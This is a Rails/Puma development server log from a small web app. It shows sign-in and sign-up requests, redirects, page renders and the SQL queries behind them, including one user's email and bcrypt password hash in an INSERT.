=> Booting Puma
=> Rails 6.1.3.2 application starting in development 
=> Run `bin/rails server --help` for more startup options
Puma starting in single mode...
* Puma version: 5.3.2 (ruby 3.0.1-p64) ("Sweetnighter")
*  Min threads: 5
*  Max threads: 5
*  Environment: development
*          PID: 3515
* Listening on http://10.0.0.161:3000
Use Ctrl-C to stop
Started GET "/" for 10.0.0.161 at 2021-05-28 19:39:50 -0600
Cannot render console from 10.0.0.161! Allowed networks: 127.0.0.0/127.255.255.255, ::1
  [1m[35m (1.0ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
  [1m[35m (0.2ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
Processing by HomeController#index as HTML
  [1m[36mDisabledAccount Load (0.5ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.4ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
Redirected to http://10.0.0.161:3000/users/sign_in
  [1m[36mAdmin Load (0.6ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/home_controller.rb:4:in `index'
Completed 302 Found in 30ms (ActiveRecord: 2.7ms | Allocations: 10216)


Started GET "/users/sign_in" for 10.0.0.161 at 2021-05-28 19:39:50 -0600
Cannot render console from 10.0.0.161! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by Devise::SessionsController#new as HTML
  [1m[36mDisabledAccount Load (0.1ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  Rendering layout layouts/application.html.erb
  Rendering devise/sessions/new.html.erb within layouts/application
  Rendered devise/shared/_links.html.erb (Duration: 1.4ms | Allocations: 575)
  Rendered devise/sessions/new.html.erb within layouts/application (Duration: 17.6ms | Allocations: 7154)
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 1.5ms | Allocations: 665)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 53.9ms | Allocations: 16468)
Completed 200 OK in 75ms (Views: 60.4ms | ActiveRecord: 1.2ms | Allocations: 25370)


Started GET "/" for 120.89.94.54 at 2021-05-28 20:49:04 -0600
Cannot render console from 120.89.94.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by HomeController#index as HTML
  [1m[35m (0.3ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.5ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.5ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
Redirected to http://98.202.32.36/users/sign_in
  [1m[36mAdmin Load (0.5ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/home_controller.rb:4:in `index'
Completed 302 Found in 27ms (ActiveRecord: 2.8ms | Allocations: 3276)


Started GET "/" for 10.0.0.55 at 2021-05-28 21:03:24 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by HomeController#index as HTML
  [1m[35m (0.3ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.5ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.5ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
Redirected to http://10.0.0.161:3000/users/sign_in
  [1m[36mAdmin Load (0.5ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/home_controller.rb:4:in `index'
Completed 302 Found in 27ms (ActiveRecord: 2.9ms | Allocations: 3005)


Started GET "/users/sign_in" for 10.0.0.55 at 2021-05-28 21:03:24 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by Devise::SessionsController#new as HTML
  [1m[36mDisabledAccount Load (0.3ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  Rendering layout layouts/application.html.erb
  Rendering devise/sessions/new.html.erb within layouts/application
  Rendered devise/shared/_links.html.erb (Duration: 0.6ms | Allocations: 109)
  Rendered devise/sessions/new.html.erb within layouts/application (Duration: 4.6ms | Allocations: 842)
  [1m[36mAdmSetting Load (0.5ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.4ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.7ms | Allocations: 156)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 31.4ms | Allocations: 6443)
Completed 200 OK in 45ms (Views: 32.0ms | ActiveRecord: 1.4ms | Allocations: 8432)


Started POST "/users/sign_in" for 10.0.0.55 at 2021-05-28 21:04:10 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by Devise::SessionsController#create as HTML
  Parameters: {"authenticity_token"=>"[FILTERED]", "user"=>{"email"=>"1529jag@vatlnetwork.net", "password"=>"[FILTERED]", "remember_me"=>"0"}, "commit"=>"Log in"}
  [1m[36mDisabledAccount Load (0.1ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
Completed 401 Unauthorized in 7ms (ActiveRecord: 0.4ms | Allocations: 1753)


Processing by Devise::SessionsController#new as HTML
  Parameters: {"authenticity_token"=>"[FILTERED]", "user"=>{"email"=>"1529jag@vatlnetwork.net", "password"=>"[FILTERED]", "remember_me"=>"0"}, "commit"=>"Log in"}
  [1m[36mCACHE DisabledAccount Load (0.0ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  Rendering layout layouts/application.html.erb
  Rendering devise/sessions/new.html.erb within layouts/application
  Rendered devise/shared/_links.html.erb (Duration: 0.2ms | Allocations: 106)
  Rendered devise/sessions/new.html.erb within layouts/application (Duration: 1.4ms | Allocations: 722)
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.3ms | Allocations: 148)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 11.3ms | Allocations: 6120)
Completed 200 OK in 15ms (Views: 11.6ms | ActiveRecord: 0.2ms | Allocations: 7947)


Started GET "/users/sign_in" for 10.0.0.55 at 2021-05-28 21:06:25 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by Devise::SessionsController#new as HTML
  [1m[36mDisabledAccount Load (0.3ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  Rendering layout layouts/application.html.erb
  Rendering devise/sessions/new.html.erb within layouts/application
  Rendered devise/shared/_links.html.erb (Duration: 0.2ms | Allocations: 106)
  Rendered devise/sessions/new.html.erb within layouts/application (Duration: 1.3ms | Allocations: 720)
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.3ms | Allocations: 156)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 11.4ms | Allocations: 6121)
Completed 200 OK in 21ms (Views: 11.7ms | ActiveRecord: 0.6ms | Allocations: 8111)


Started GET "/users/sign_up" for 10.0.0.55 at 2021-05-28 21:06:29 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by Devise::RegistrationsController#new as HTML
  [1m[36mDisabledAccount Load (0.4ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.3ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  Rendering layout layouts/application.html.erb
  Rendering devise/registrations/new.html.erb within layouts/application
  Rendered devise/shared/_error_messages.html.erb (Duration: 1.9ms | Allocations: 238)
  Rendered devise/shared/_links.html.erb (Duration: 0.8ms | Allocations: 155)
  Rendered devise/registrations/new.html.erb within layouts/application (Duration: 9.3ms | Allocations: 1588)
  [1m[36mAdmSetting Load (0.3ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.8ms | Allocations: 188)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 37.9ms | Allocations: 7284)
Completed 200 OK in 58ms (Views: 43.0ms | ActiveRecord: 1.2ms | Allocations: 10311)


Started POST "/users" for 10.0.0.55 at 2021-05-28 21:06:48 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by Devise::RegistrationsController#create as HTML
  Parameters: {"authenticity_token"=>"[FILTERED]", "user"=>{"email"=>"1529jag@vatlnetwork.net", "password"=>"[FILTERED]", "password_confirmation"=>"[FILTERED]"}, "commit"=>"Sign up"}
  [1m[36mDisabledAccount Load (0.1ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" IS NULL LIMIT ?[0m  [["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mTRANSACTION (0.1ms)[0m  [1m[36mbegin transaction[0m
  [1m[36mUser Exists? (2.5ms)[0m  [1m[34mSELECT 1 AS one FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  [1m[36mUser Create (1.1ms)[0m  [1m[32mINSERT INTO "users" ("email", "encrypted_password", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["email", "1529jag@vatlnetwork.net"], ["encrypted_password", "$2a$12$hUCV3IzdioX0AKSckBzo/OYm1AEzn4/bfP7rywI8D.3uY9XMAv0A."], ["created_at", "2021-05-29 03:06:48.344900"], ["updated_at", "2021-05-29 03:06:48.344900"]]
  [1m[36mTRANSACTION (3.2ms)[0m  [1m[36mcommit transaction[0m
Redirected to http://10.0.0.161:3000/
Completed 302 Found in 314ms (ActiveRecord: 7.1ms | Allocations: 12913)


Started GET "/" for 10.0.0.55 at 2021-05-28 21:06:48 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by HomeController#index as HTML
  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.1ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.1ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/home_controller.rb:4:in `index'
  Rendering layout layouts/application.html.erb
  Rendering home/index.html.erb within layouts/application
  Rendered home/index.html.erb within layouts/application (Duration: 0.3ms | Allocations: 133)
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.5ms | Allocations: 305)
  Rendered layouts/_alerts.html.erb (Duration: 0.7ms | Allocations: 137)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 11.8ms | Allocations: 6322)
Completed 200 OK in 21ms (Views: 13.1ms | ActiveRecord: 0.7ms | Allocations: 10620)


Started GET "/posts" for 10.0.0.55 at 2021-05-28 21:06:54 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by PostsController#index as HTML
  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.1ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.1ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:21:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms5" = ? LIMIT ?[0m  [["adms5", 0], ["LIMIT", 1]]
  ↳ app/controllers/posts_controller.rb:7:in `check_status'
  Rendering layout layouts/application.html.erb
  Rendering posts/index.html.erb within layouts/application
  [1m[36mPost Load (0.6ms)[0m  [1m[34mSELECT "posts".* FROM "posts"[0m
  ↳ app/views/posts/index.html.erb:5
  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 8], ["LIMIT", 1]]
  ↳ app/views/posts/index.html.erb:6
  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 6], ["LIMIT", 1]]
  ↳ app/views/posts/index.html.erb:6
  Rendered posts/index.html.erb within layouts/application (Duration: 27.8ms | Allocations: 8686)
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.1ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.6ms | Allocations: 264)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 43.6ms | Allocations: 14311)
Completed 200 OK in 68ms (Views: 44.2ms | ActiveRecord: 2.8ms | Allocations: 20013)


Started GET "/todos" for 10.0.0.55 at 2021-05-28 21:06:57 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by TodosController#index as HTML
  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.3ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.3ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:21:in `validate_login'
  [1m[36mAdmSetting Load (0.6ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms4" = ? LIMIT ?[0m  [["adms4", 0], ["LIMIT", 1]]
  ↳ app/controllers/todos_controller.rb:7:in `check_status'
  Rendering layout layouts/application.html.erb
  Rendering todos/index.html.erb within layouts/application
  [1m[36mTodo Load (0.9ms)[0m  [1m[34mSELECT "todos".* FROM "todos"[0m
  ↳ app/views/todos/index.html.erb:14
  Rendered todos/index.html.erb within layouts/application (Duration: 9.9ms | Allocations: 1237)
  [1m[36mAdmSetting Load (0.3ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:9
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 1.0ms | Allocations: 267)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 40.0ms | Allocations: 6965)
Completed 200 OK in 82ms (Views: 43.7ms | ActiveRecord: 3.3ms | Allocations: 12468)


Started GET "/friends" for 10.0.0.55 at 2021-05-28 21:06:59 -0600
Cannot render console from 10.0.0.55! Allowed networks: 127.0.0.0/127.255.255.255, ::1
Processing by FriendsController#index as HTML
  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? ORDER BY "users"."id" ASC LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mDisabledAccount Load (0.3ms)[0m  [1m[34mSELECT "disabled_accounts".* FROM "disabled_accounts" WHERE "disabled_accounts"."email" = ? LIMIT ?[0m  [["email", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:4:in `validate_login'
  [1m[36mAdmSetting Load (0.2ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms1" = ? LIMIT ?[0m  [["adms1", 0], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:10:in `validate_login'
  [1m[36mAdmin Load (0.3ms)[0m  [1m[34mSELECT "admins".* FROM "admins" WHERE "admins"."admin" = ? LIMIT ?[0m  [["admin", "1529jag@vatlnetwork.net"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:21:in `validate_login'
  Rendering layout layouts/application.html.erb
  Rendering friends/index.html.erb within layouts/application
  [1m[36mFriend Load (1.0ms)[0m  [1m[34mSELECT "friends".* FROM "friends"[0m
  ↳ app/views/friends/index.html.erb:15
